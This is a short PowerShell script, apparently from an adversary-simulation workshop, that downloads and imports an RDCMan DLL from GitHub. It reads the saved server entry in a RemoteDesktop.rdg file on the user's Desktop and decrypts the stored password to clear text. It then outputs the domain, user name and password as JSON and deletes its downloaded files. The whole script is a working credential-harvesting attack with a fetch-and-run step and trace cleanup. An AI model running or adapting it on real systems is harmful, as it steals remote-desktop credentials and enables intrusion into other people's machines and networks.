iwr -UseBasicParsing "https://github.com/mobia-security-services/adversarysimulationworkshop/raw/main/RDCMan.zip" -OutFile $env:TEMP\RDCMan.zip
Expand-Archive -Path $env:TEMP\RDCMan.zip -DestinationPath $env:TEMP -Force
cd $env:TEMP\RDCMan
Import-Module $env:TEMP\RDCMan\bin\RDCMan.dll

$xml = New-Object -TypeName XML
$xml.Load("${env:USERPROFILE}\Desktop\RemoteDesktop.rdg")
$domain = $xml.RDCMan.file.group.server.FirstChild.domain
$user = $xml.RDCMan.file.group.server.FirstChild.userName
$password = $xml.RDCMan.file.group.server.FirstChild.password
$EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
$clearTextPassword = [RdcMan.Encryption]::DecryptString($password, $EncryptionSettings)

$result = @{
    "domain" = $domain
    "user" = $user
    "pwd" = $clearTextPassword
}

$result | ConvertTo-Json


Remove-Module $PSScriptRoot\bin\RDCMan.dll -Force -ErrorAction SilentlyContinue
Remove-Item -Recurse -Path $env:TEMP\RDCMan -Force -ErrorAction SilentlyContinue
Remove-Item -Recurse -Path $env:TEMP\RDCMan.zip -Force -ErrorAction SilentlyContinue